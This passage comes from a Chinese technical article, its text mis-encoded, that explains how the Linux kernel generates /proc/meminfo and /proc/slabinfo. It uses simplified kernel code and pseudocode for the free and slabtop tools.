    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sreclaimable, sunreclaim;
    
    <span class="hljs-comment">// 1. è·å–åŸºæœ¬å†…å­˜ä¿¡æ¯</span>
    si_meminfo(&amp;i);
    si_swapinfo(&amp;i);
    
    <span class="hljs-comment">// 2. è®¡ç®—ç¼“å­˜å†…å­˜</span>
    cached = global_node_page_state(NR_FILE_PAGES) -
             total_swapcache_pages() - i.bufferram;
    <span class="hljs-keyword">if</span> (cached &lt; <span class="hljs-number">0</span>)
        cached = <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">// 3. è·å– LRU åˆ—è¡¨ç»Ÿè®¡</span>
    <span class="hljs-keyword">for</span> (lru = LRU_BASE; lru &lt; NR_LRU_LISTS; lru++)
        pages[lru] = global_node_page_state(NR_LRU_BASE + lru);
    
    <span class="hljs-comment">// 4. è®¡ç®—å¯ç”¨å†…å­˜</span>
    available = si_mem_available();
    
    <span class="hljs-comment">// 5. è·å– slab ç»Ÿè®¡</span>
    sreclaimable = global_node_page_state_pages(NR_SLAB_RECLAIMABLE_B);
    sunreclaim = global_node_page_state_pages(NR_SLAB_UNRECLAIMABLE_B);
    
    <span class="hljs-comment">// 6. è¾“å‡ºå„é¡¹ç»Ÿè®¡</span>
    show_val_kb(m, <span class="hljs-string">"MemTotal:       "</span>, i.totalram);
    show_val_kb(m, <span class="hljs-string">"MemFree:        "</span>, i.freeram);
    show_val_kb(m, <span class="hljs-string">"MemAvailable:   "</span>, available);
    show_val_kb(m, <span class="hljs-string">"Buffers:        "</span>, i.bufferram);
    show_val_kb(m, <span class="hljs-string">"Cached:         "</span>, cached);
    <span class="hljs-comment">// ... æ›´å¤šå­—æ®µ</span>
}
</code></pre>
<p><strong>å…³é”®å‡½æ•°è¯´æ˜</strong>ï¼š</p>
<ol>
<li>
<p><strong>si_meminfo()</strong>ï¼š</p>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šè·å–åŸºæœ¬å†…å­˜ä¿¡æ¯</li>
<li><strong>æ¥æº</strong>ï¼š<code>global_zone_page_state(NR_FREE_PAGES)</code> ç­‰</li>
<li><strong>è¾“å‡º</strong>ï¼š<code>totalram</code>ã€<code>freeram</code>ã€<code>bufferram</code> ç­‰</li>
</ul>
</li>
<li>
<p><strong>global_node_page_state()</strong>ï¼š</p>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šè·å–èŠ‚ç‚¹çº§åˆ«çš„é¡µé¢ç»Ÿè®¡</li>
<li><strong>æ¥æº</strong>ï¼š<code>vmstat</code> å­ç³»ç»Ÿ</li>
<li><strong>ç»Ÿè®¡ç±»å‹</strong>ï¼š<code>NR_FILE_PAGES</code>ã€<code>NR_ANON_MAPPED</code> ç­‰</li>
</ul>
</li>
<li>
<p><strong>si_mem_available()</strong>ï¼š</p>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šè®¡ç®—å¯ç”¨å†…å­˜</li>
<li><strong>å…¬å¼</strong>ï¼š<code>free + reclaimable - reserved</code></li>
<li><strong>reclaimable</strong>ï¼šåŒ…æ‹¬ç¼“å­˜ã€slab å¯å›æ”¶éƒ¨åˆ†ç­‰</li>
</ul>
</li>
</ol>
<h3 data-id="heading-60">6.4 å†…å­˜ç»Ÿè®¡çš„æ›´æ–°æœºåˆ¶</h3>
<p><strong>é¡µé¢çŠ¶æ€ç»Ÿè®¡</strong>ï¼š</p>
<p>Linux å†…æ ¸ä½¿ç”¨ <code>vmstat</code> å­ç³»ç»Ÿè·Ÿè¸ªå„ç§é¡µé¢çŠ¶æ€ã€‚æ¯æ¬¡é¡µé¢çŠ¶æ€å˜åŒ–æ—¶ï¼Œéƒ½ä¼šæ›´æ–°ç›¸åº”çš„è®¡æ•°å™¨ã€‚</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// mm/vmstat.c</span>
<span class="hljs-type">void</span> __mod_zone_page_state(<span class="hljs-keyword">struct</span> zone *zone, <span class="hljs-keyword">enum</span> zone_stat_item item,
                           <span class="hljs-type">long</span> delta)
{
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">per_cpu_pageset</span> __<span class="hljs-title">percpu</span> *<span class="hljs-title">pcp</span> =</span> zone-&gt;pageset;
    s8 __percpu *p = pcp-&gt;vm_stat_diff + item;
    
    <span class="hljs-comment">// æ›´æ–°æ¯ CPU ç»Ÿè®¡</span>
    *p += delta;
    
    <span class="hljs-comment">// å¦‚æœè¶…è¿‡é˜ˆå€¼ï¼Œæ›´æ–°å…¨å±€ç»Ÿè®¡</span>
    <span class="hljs-keyword">if</span> (unlikely(*p &gt; pcp-&gt;stat_threshold || *p &lt; -pcp-&gt;stat_threshold)) {
        zone_page_state_add(*p, zone, item);
        *p = <span class="hljs-number">0</span>;
    }
}
</code></pre>
<p><strong>ç»Ÿè®¡ç±»å‹</strong>ï¼š</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// include/linux/mmzone.h</span>
<span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">zone_stat_item</span> {</span>
    NR_FREE_PAGES,           <span class="hljs-comment">// ç©ºé—²é¡µé¢</span>
    NR_ZONE_LRU_BASE,        <span class="hljs-comment">// LRU åˆ—è¡¨åŸºæ•°</span>
    NR_ZONE_INACTIVE_ANON,   <span class="hljs-comment">// éæ´»è·ƒåŒ¿åé¡µé¢</span>
    NR_ZONE_ACTIVE_ANON,     <span class="hljs-comment">// æ´»è·ƒåŒ¿åé¡µé¢</span>
    NR_ZONE_INACTIVE_FILE,   <span class="hljs-comment">// éæ´»è·ƒæ–‡ä»¶é¡µé¢</span>
    NR_ZONE_ACTIVE_FILE,     <span class="hljs-comment">// æ´»è·ƒæ–‡ä»¶é¡µé¢</span>
    NR_ZONE_UNEVICTABLE,     <span class="hljs-comment">// ä¸å¯å›æ”¶é¡µé¢</span>
    NR_ZONE_WRITE_PENDING,   <span class="hljs-comment">// ç­‰å¾…å†™å…¥çš„é¡µé¢</span>
    NR_MLOCK,                <span class="hljs-comment">// é”å®šçš„é¡µé¢</span>
    NR_PAGETABLE,            <span class="hljs-comment">// é¡µè¡¨é¡µé¢</span>
    NR_KERNEL_STACK_KB,      <span class="hljs-comment">// å†…æ ¸æ ˆ</span>
    NR_BOUNCE,               <span class="hljs-comment">// åå¼¹ç¼“å†²åŒº</span>
    NR_ZONE_WRITE_BACK,      <span class="hljs-comment">// å›å†™é¡µé¢</span>
    NR_ZONE_CMA_FREE,        <span class="hljs-comment">// CMA ç©ºé—²é¡µé¢</span>
    <span class="hljs-comment">// ...</span>
};
</code></pre>
<p><strong>å†…å­˜åˆ†é…æ—¶çš„ç»Ÿè®¡æ›´æ–°</strong>ï¼š</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// mm/page_alloc.c</span>
<span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> __free_one_page(<span class="hljs-keyword">struct</span> page *page, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> pfn,
                                   <span class="hljs-keyword">struct</span> zone *zone, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order)
{
    <span class="hljs-comment">// é‡Šæ”¾é¡µé¢</span>
    <span class="hljs-comment">// ...</span>
    
    <span class="hljs-comment">// æ›´æ–°ç»Ÿè®¡</span>
    __mod_zone_page_state(zone, NR_FREE_PAGES, <span class="hljs-number">1</span> &lt;&lt; order);
}
</code></pre>
<h3 data-id="heading-61">6.5 free å·¥å…·çš„è®¡ç®—æ–¹å¼</h3>
<p><strong>free å·¥å…·è¯»å–æ•°æ®</strong>ï¼š</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// free å·¥å…·çš„ç®€åŒ–ä¼ªä»£ç </span>
<span class="hljs-type">void</span> <span class="hljs-title function_">read_meminfo</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
{
    FILE *fp = fopen(<span class="hljs-string">"/proc/meminfo"</span>, <span class="hljs-string">"r"</span>);
    <span class="hljs-type">char</span> line[<span class="hljs-number">256</span>];
    
    <span class="hljs-keyword">while</span> (fgets(line, <span class="hljs-keyword">sizeof</span>(line), fp)) {
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>(line, <span class="hljs-string">"MemTotal:"</span>, <span class="hljs-number">9</span>) == <span class="hljs-number">0</span>) {
            <span class="hljs-built_in">sscanf</span>(line, <span class="hljs-string">"MemTotal: %lu kB"</span>, &amp;mem_total);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>(line, <span class="hljs-string">"MemFree:"</span>, <span class="hljs-number">8</span>) == <span class="hljs-number">0</span>) {
            <span class="hljs-built_in">sscanf</span>(line, <span class="hljs-string">"MemFree: %lu kB"</span>, &amp;mem_free);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>(line, <span class="hljs-string">"Buffers:"</span>, <span class="hljs-number">8</span>) == <span class="hljs-number">0</span>) {
            <span class="hljs-built_in">sscanf</span>(line, <span class="hljs-string">"Buffers: %lu kB"</span>, &amp;buffers);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>(line, <span class="hljs-string">"Cached:"</span>, <span class="hljs-number">7</span>) == <span class="hljs-number">0</span>) {
            <span class="hljs-built_in">sscanf</span>(line, <span class="hljs-string">"Cached: %lu kB"</span>, &amp;cached);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>(line, <span class="hljs-string">"SReclaimable:"</span>, <span class="hljs-number">13</span>) == <span class="hljs-number">0</span>) {
            <span class="hljs-built_in">sscanf</span>(line, <span class="hljs-string">"SReclaimable: %lu kB"</span>, &amp;sreclaimable);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>(line, <span class="hljs-string">"MemAvailable:"</span>, <span class="hljs-number">13</span>) == <span class="hljs-number">0</span>) {
            <span class="hljs-built_in">sscanf</span>(line, <span class="hljs-string">"MemAvailable: %lu kB"</span>, &amp;mem_available);
        }
        <span class="hljs-comment">// ... æ›´å¤šå­—æ®µ</span>
    }
    
    fclose(fp);
    
    <span class="hljs-comment">// è®¡ç®— used</span>
    used = total - <span class="hljs-built_in">free</span> - (buffers + cached + sreclaimable);
    
    <span class="hljs-comment">// è®¡ç®— buff/cache</span>
    buff_cache = buffers + cached + sreclaimable;
}
</code></pre>
<p><strong>å…³é”®ç‚¹</strong>ï¼š</p>
<ol>
<li><strong>å®æ—¶è¯»å–</strong>ï¼šæ¯æ¬¡è¿è¡Œ free éƒ½é‡æ–°è¯»å– <code>/proc/meminfo</code></li>
<li><strong>è®¡ç®— used</strong>ï¼š<code>used = total - free - buff/cache</code></li>
<li><strong>å•ä½è½¬æ¢</strong>ï¼šå†…æ ¸ä»¥ KB ä¸ºå•ä½ï¼Œfree å¯ä»¥è½¬æ¢ä¸º MBã€GB ç­‰</li>
</ol>
<hr/>
<h2 data-id="heading-62">7. slabtop å·¥å…·è¯¦è§£</h2>
<h3 data-id="heading-63">7.1 slabtop å·¥å…·æ˜¯ä»€ä¹ˆï¼Ÿ</h3>
<p><strong>slabtop çš„å®šä¹‰</strong>ï¼š</p>
<p>slabtop æ˜¯ Linux ç³»ç»Ÿä¸­ç”¨äºå®æ—¶æ˜¾ç¤ºå†…æ ¸ slab åˆ†é…å™¨ä½¿ç”¨æƒ…å†µçš„å·¥å…·ã€‚å®ƒè¯»å– <code>/proc/slabinfo</code> æ–‡ä»¶ï¼Œå¹¶ä»¥ç±»ä¼¼ top çš„ç•Œé¢æ˜¾ç¤ºå„ä¸ª slab ç¼“å­˜çš„ç»Ÿè®¡ä¿¡æ¯ã€‚</p>
<p><strong>slabtop çš„ç‰¹ç‚¹</strong>ï¼š</p>
<ol>
<li><strong>å®æ—¶æ›´æ–°</strong>ï¼šé»˜è®¤æ¯ 3 ç§’æ›´æ–°ä¸€æ¬¡</li>
<li><strong>äº¤äº’å¼</strong>ï¼šæ”¯æŒé”®ç›˜å‘½ä»¤æ“ä½œ</li>
<li><strong>è¯¦ç»†ç»Ÿè®¡</strong>ï¼šæ˜¾ç¤ºæ¯ä¸ª slab ç¼“å­˜çš„è¯¦ç»†ä¿¡æ¯</li>
<li><strong>æ’åºåŠŸèƒ½</strong>ï¼šå¯ä»¥æŒ‰ä¸åŒå­—æ®µæ’åº</li>
</ol>
<p><strong>slabtop çš„å®‰è£…</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Debian/Ubuntu</span>
apt-get install procps

<span class="hljs-comment"># CentOS/RHEL</span>
yum install procps-ng

<span class="hljs-comment"># éªŒè¯å®‰è£…</span>
slabtop --version
</code></pre>
<h3 data-id="heading-64">7.2 slabtop çš„è¾“å‡ºè¯¦è§£</h3>
<p><strong>slabtop è¾“å‡ºç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-erlang" lang="erlang"> Active / Total Objects (<span class="hljs-comment">% used)    : 123456 / 234567 (52.6%)</span>
 Active / Total Slabs (<span class="hljs-comment">% used)      : 1234 / 2345 (52.6%)</span>
 Active / Total Caches (<span class="hljs-comment">% used)     : 123 / 234 (52.6%)</span>
 Active / Total Size (<span class="hljs-comment">% used)       : 12345678 / 23456789 (52.6%)</span>
 Minimum / Average / Maximum Object : <span class="hljs-number">0.01</span>K / <span class="hljs-number">0.05</span>K / <span class="hljs-number">0.10</span>K

  OBJS ACTIVE  USE OBJ SIZE  SLABS OBJ/SLAB CACHE SIZE NAME
 <span class="hljs-number">12345</span>  <span class="hljs-number">1234</span>  <span class="hljs-number">10</span><span class="hljs-comment">%    0.05K     123     100     1234K  kmalloc-64</span>
 <span class="hljs-number">23456</span>  <span class="hljs-number">2345</span>  <span class="hljs-number">20</span><span class="hljs-comment">%    0.10K     234     100     2345K  kmalloc-128</span>
</code></pre>
<p><strong>å­—æ®µè¯¦ç»†è¯´æ˜</strong>ï¼š</p>
<ol>
<li>
<p><strong>OBJS</strong>ï¼š</p>
<ul>
<li><strong>å«ä¹‰</strong>ï¼šå¯¹è±¡æ€»æ•°</li>
<li><strong>æ¥æº</strong>ï¼š<code>slabinfo.num_objs</code></li>
<li><strong>è®¡ç®—</strong>ï¼š<code>total_slabs * objects_per_slab</code></li>
</ul>
</li>
<li>
<p><strong>ACTIVE</strong>ï¼š</p>
<ul>
<li><strong>å«ä¹‰</strong>ï¼šæ´»è·ƒå¯¹è±¡æ•°</li>
<li><strong>æ¥æº</strong>ï¼š<code>slabinfo.active_objs</code></li>
<li><strong>è®¡ç®—</strong>ï¼š<code>num_objs - free_objs</code></li>
</ul>
</li>
<li>
<p><strong>USE</strong>ï¼š</p>
<ul>
<li><strong>å«ä¹‰</strong>ï¼šä½¿ç”¨ç‡</li>
<li><strong>è®¡ç®—</strong>ï¼š<code>active_objs / num_objs * 100%</code></li>
</ul>
</li>
<li>
<p><strong>OBJ SIZE</strong>ï¼š</p>
<ul>
<li><strong>å«ä¹‰</strong>ï¼šå¯¹è±¡å¤§å°</li>
<li><strong>æ¥æº</strong>ï¼š<code>kmem_cache-&gt;size</code></li>
</ul>
</li>
<li>
<p><strong>SLABS</strong>ï¼š</p>
<ul>
<li><strong>å«ä¹‰</strong>ï¼šslab æ€»æ•°</li>
<li><strong>æ¥æº</strong>ï¼š<code>slabinfo.num_slabs</code></li>
</ul>
</li>
<li>
<p><strong>OBJ/SLAB</strong>ï¼š</p>
<ul>
<li><strong>å«ä¹‰</strong>ï¼šæ¯ä¸ª slab çš„å¯¹è±¡æ•°</li>
<li><strong>æ¥æº</strong>ï¼š<code>slabinfo.objects_per_slab</code></li>
</ul>
</li>
<li>
<p><strong>CACHE SIZE</strong>ï¼š</p>
<ul>
<li><strong>å«ä¹‰</strong>ï¼šç¼“å­˜æ€»å¤§å°</li>
<li><strong>è®¡ç®—</strong>ï¼š<code>num_slabs * (1 &lt;&lt; cache_order) * PAGE_SIZE</code></li>
</ul>
</li>
<li>
<p><strong>NAME</strong>ï¼š</p>
<ul>
<li><strong>å«ä¹‰</strong>ï¼šç¼“å­˜åç§°</li>
<li><strong>æ¥æº</strong>ï¼š<code>kmem_cache-&gt;name</code></li>
</ul>
</li>
</ol>
<h3 data-id="heading-65">7.3 /proc/slabinfo çš„ç”ŸæˆåŸç†</h3>
<p><strong>slab_show() å‡½æ•°</strong>ï¼š</p>
<p><code>/proc/slabinfo</code> æ–‡ä»¶ç”± <code>slab_show()</code> å‡½æ•°ç”Ÿæˆï¼Œå®ƒéå†æ‰€æœ‰ slab ç¼“å­˜å¹¶æ˜¾ç¤ºç»Ÿè®¡ä¿¡æ¯ã€‚</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// mm/slab_common.c</span>
<span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">slab_show</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *p)</span>
{
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">s</span> =</span> list_entry(p, <span class="hljs-keyword">struct</span> kmem_cache, <span class="hljs-built_in">list</span>);
    
    <span class="hljs-keyword">if</span> (p == slab_caches.next)
        print_slabinfo_header(m);
    
    cache_show(s, m);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}

<span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">cache_show</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-keyword">struct</span> seq_file *m)</span>
{
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slabinfo</span> <span class="hljs-title">sinfo</span>;</span>
    
    <span class="hljs-built_in">memset</span>(&amp;sinfo, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(sinfo));
    get_slabinfo(s, &amp;sinfo);
    
    seq_printf(m, <span class="hljs-string">"%-17s %6lu %6lu %6u %4u %4d"</span>,
               s-&gt;name, sinfo.active_objs, sinfo.num_objs, s-&gt;size,
               sinfo.objects_per_slab, (<span class="hljs-number">1</span> &lt;&lt; sinfo.cache_order));
    
    seq_printf(m, <span class="hljs-string">" : tunables %4u %4u %4u"</span>,
               sinfo.limit, sinfo.batchcount, sinfo.shared);
    seq_printf(m, <span class="hljs-string">" : slabdata %6lu %6lu %6lu"</span>,
               sinfo.active_slabs, sinfo.num_slabs, sinfo.shared_avail);
    slabinfo_show_stats(m, s);
    seq_putc(m, <span class="hljs-string">'\n'</span>);
}
</code></pre>
<p><strong>get_slabinfo() å‡½æ•°</strong>ï¼š</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// mm/slab.c</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">get_slabinfo</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *cachep, <span class="hljs-keyword">struct</span> slabinfo *sinfo)</span>
{
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> active_objs, num_objs, active_slabs;
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> total_slabs = <span class="hljs-number">0</span>, free_objs = <span class="hljs-number">0</span>, shared_avail = <span class="hljs-number">0</span>;
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> free_slabs = <span class="hljs-number">0</span>;
    <span class="hljs-type">int</span> node;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> *<span class="hljs-title">n</span>;</span>
    
    <span class="hljs-comment">// éå†æ‰€æœ‰èŠ‚ç‚¹ï¼Œç´¯åŠ ç»Ÿè®¡</span>
    for_each_kmem_cache_node(cachep, node, n) {
        spin_lock_irq(&amp;n-&gt;list_lock);
        
        total_slabs += n-&gt;total_slabs;
        free_slabs += n-&gt;free_slabs;
        free_objs += n-&gt;free_objects;
        
        <span class="hljs-keyword">if</span> (n-&gt;shared)
            shared_avail += n-&gt;shared-&gt;avail;
        
        spin_unlock_irq(&amp;n-&gt;list_lock);
    }
    
    <span class="hljs-comment">// è®¡ç®—æ€»å¯¹è±¡æ•°</span>
    num_objs = total_slabs * cachep-&gt;num;
    
    <span class="hljs-comment">// è®¡ç®—æ´»è·ƒ slab æ•°</span>
    active_slabs = total_slabs - free_slabs;
    
    <span class="hljs-comment">// è®¡ç®—æ´»è·ƒå¯¹è±¡æ•°</span>
    active_objs = num_objs - free_objs;
    
    <span class="hljs-comment">// å¡«å……ç»Ÿè®¡ä¿¡æ¯</span>
    sinfo-&gt;active_objs = active_objs;
    sinfo-&gt;num_objs = num_objs;
    sinfo-&gt;active_slabs = active_slabs;
    sinfo-&gt;num_slabs = total_slabs;
    sinfo-&gt;shared_avail = shared_avail;
    sinfo-&gt;limit = cachep-&gt;limit;
    sinfo-&gt;batchcount = cachep-&gt;batchcount;
    sinfo-&gt;shared = cachep-&gt;shared;
    sinfo-&gt;objects_per_slab = cachep-&gt;num;
    sinfo-&gt;cache_order = cachep-&gt;gfporder;
}
</code></pre>
<h3 data-id="heading-66">7.4 Slab åˆ†é…å™¨çš„ç»Ÿè®¡æœºåˆ¶</h3>
<p><strong>Slab åˆ†é…å™¨ç»“æ„</strong>ï¼š</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// mm/slab.h</span>
<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> {</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">array_cache</span> __<span class="hljs-title">percpu</span> *<span class="hljs-title">cpu_cache</span>;</span>  <span class="hljs-comment">// æ¯ CPU ç¼“å­˜</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> *<span class="hljs-title">node</span>[<span class="hljs-title">MAX_NUMNODES</span>];</span>  <span class="hljs-comment">// æ¯èŠ‚ç‚¹ç¼“å­˜</span>
    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size;  <span class="hljs-comment">// å¯¹è±¡å¤§å°</span>
    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> num;  <span class="hljs-comment">// æ¯ä¸ª slab çš„å¯¹è±¡æ•°</span>
    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> gfporder;  <span class="hljs-comment">// slab çš„é¡µé¢æ•°ï¼ˆ2^gfporderï¼‰</span>
    <span class="hljs-comment">// ...</span>
};

<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> {</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">slabs_full</span>;</span>  <span class="hljs-comment">// æ»¡ slab åˆ—è¡¨</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">slabs_partial</span>;</span>  <span class="hljs-comment">// éƒ¨åˆ† slab åˆ—è¡¨</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">slabs_free</span>;</span>  <span class="hljs-comment">// ç©ºé—² slab åˆ—è¡¨</span>
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> total_slabs;  <span class="hljs-comment">// æ€» slab æ•°</span>
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> free_slabs;  <span class="hljs-comment">// ç©ºé—² slab æ•°</span>
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> free_objects;  <span class="hljs-comment">// ç©ºé—²å¯¹è±¡æ•°</span>
    <span class="hljs-comment">// ...</span>
};
</code></pre>
<p><strong>ç»Ÿè®¡æ›´æ–°æœºåˆ¶</strong>ï¼š</p>
<ol>
<li>
<p><strong>åˆ†é…å¯¹è±¡æ—¶</strong>ï¼š</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// mm/slab.c</span>
<span class="hljs-type">void</span> *<span class="hljs-title function_">kmem_cache_alloc</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *cachep, <span class="hljs-type">gfp_t</span> flags)</span>
{
    <span class="hljs-comment">// ä»æ¯ CPU ç¼“å­˜åˆ†é…</span>
    <span class="hljs-comment">// å¦‚æœä¸ºç©ºï¼Œä»èŠ‚ç‚¹ç¼“å­˜å¡«å……</span>
    <span class="hljs-comment">// ...</span>
    
    <span class="hljs-comment">// æ›´æ–°ç»Ÿè®¡</span>
    STATS_INC_ACTIVE(cachep);
    STATS_INC_ALLOCED(cachep);
}
</code></pre>
</li>
<li>
<p><strong>é‡Šæ”¾å¯¹è±¡æ—¶</strong>ï¼š</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// mm/slab.c</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">kmem_cache_free</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *cachep, <span class="hljs-type">void</span> *objp)</span>
{
    <span class="hljs-comment">// é‡Šæ”¾åˆ°æ¯ CPU ç¼“å­˜</span>
    <span class="hljs-comment">// å¦‚æœæ»¡ï¼Œé‡Šæ”¾åˆ°èŠ‚ç‚¹ç¼“å­˜</span>
    <span class="hljs-comment">// ...</span>
    
    <span class="hljs-comment">// æ›´æ–°ç»Ÿè®¡</span>
    STATS_DEC_ACTIVE(cachep);
}
</code></pre>
</li>
<li>
<p><strong>åˆ›å»º slab æ—¶</strong>ï¼š</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// mm/slab.c</span>
<span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">cache_grow</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *cachep, <span class="hljs-type">gfp_t</span> flags, <span class="hljs-type">int</span> nodeid)</span>
{
    <span class="hljs-comment">// åˆ†é…é¡µé¢åˆ›å»ºæ–° slab</span>
    <span class="hljs-comment">// ...</span>
    
    <span class="hljs-comment">// æ›´æ–°ç»Ÿè®¡</span>
    n-&gt;total_slabs++;
    STATS_INC_GROWN(cachep);
}
</code></pre>
</li>
<li>
<p><strong>é”€æ¯ slab æ—¶</strong>ï¼š</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// mm/slab.c</span>
<span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">slabs_destroy</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *cachep, <span class="hljs-keyword">struct</span> list_head *<span class="hljs-built_in">list</span>)</span>
{
    <span class="hljs-comment">// é‡Šæ”¾ slab çš„é¡µé¢</span>
    <span class="hljs-comment">// ...</span>
    
    <span class="hljs-comment">// æ›´æ–°ç»Ÿè®¡</span>
    n-&gt;total_slabs--;
    n-&gt;free_slabs--;
}
</code></pre>
</li>
</ol>
<h3 data-id="heading-67">7.5 slabtop å·¥å…·çš„è®¡ç®—æ–¹å¼</h3>
<p><strong>slabtop å·¥å…·è¯»å–æ•°æ®</strong>ï¼š</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// slabtop å·¥å…·çš„ç®€åŒ–ä¼ªä»£ç </span>
<span class="hljs-type">void</span> <span class="hljs-title function_">read_slabinfo</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
{
    FILE *fp = fopen(<span class="hljs-string">"/proc/slabinfo"</span>, <span class="hljs-string">"r"</span>);
    <span class="hljs-type">char</span> line[<span class="hljs-number">1024</span>];
    
    <span class="hljs-comment">// è·³è¿‡å¤´éƒ¨</span>
    fgets(line, <span class="hljs-keyword">sizeof</span>(line), fp);  <span class="hljs-comment">// è·³è¿‡ç‰ˆæœ¬ä¿¡æ¯</span>
    fgets(line, <span class="hljs-keyword">sizeof</span>(line), fp);  <span class="hljs-comment">// è·³è¿‡ç©ºè¡Œ</span>
    
    <span class="hljs-comment">// è¯»å–æ¯ä¸ªç¼“å­˜çš„ä¿¡æ¯</span>
    <span class="hljs-keyword">while</span> (fgets(line, <span class="hljs-keyword">sizeof</span>(line), fp)) {
        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab_cache</span> <span class="hljs-title">cache</span>;</span>
        
        <span class="hljs-comment">// è§£æè¡Œ</span>
        <span class="hljs-built_in">sscanf</span>(line, <span class="hljs-string">"%s %lu %lu %u %u %u"</span>,
               cache.name, &amp;cache.active_objs, &amp;cache.num_objs,
               &amp;cache.obj_size, &amp;cache.objects_per_slab, &amp;cache.pages_per_slab);
        
        <span class="hljs-comment">// è®¡ç®—ä½¿ç”¨ç‡</span>
        cache.usage = (cache.active_objs * <span class="hljs-number">100.0</span>) / cache.num_objs;
        
        <span class="hljs-comment">// è®¡ç®—ç¼“å­˜å¤§å°</span>
        cache.cache_size = cache.num_slabs * cache.pages_per_slab * PAGE_SIZE;
        
        <span class="hljs-comment">// æ·»åŠ åˆ°åˆ—è¡¨</span>
        add_cache(&amp;cache);
    }
    
    fclose(fp);
    
    <span class="hljs-comment">// æ’åºå’Œæ˜¾ç¤º</span>
    sort_caches();
    display_caches();
}
</code></pre>
<p><strong>å…³é”®ç‚¹</strong>ï¼š</p>
<ol>
<li><strong>å®æ—¶è¯»å–</strong>ï¼šæ¯æ¬¡æ›´æ–°éƒ½é‡æ–°è¯»å– <code>/proc/slabinfo</code></li>
<li><strong>è§£ææ ¼å¼</strong>ï¼šslabinfo æ–‡ä»¶æœ‰å›ºå®šçš„æ ¼å¼</li>
<li><strong>è®¡ç®—ä½¿ç”¨ç‡</strong>ï¼š<code>usage = active_objs / num_objs * 100%</code></li>
<li><strong>æ’åºæ˜¾ç¤º</strong>ï¼šå¯ä»¥æŒ‰ä¸åŒå­—æ®µæ’åº</li>
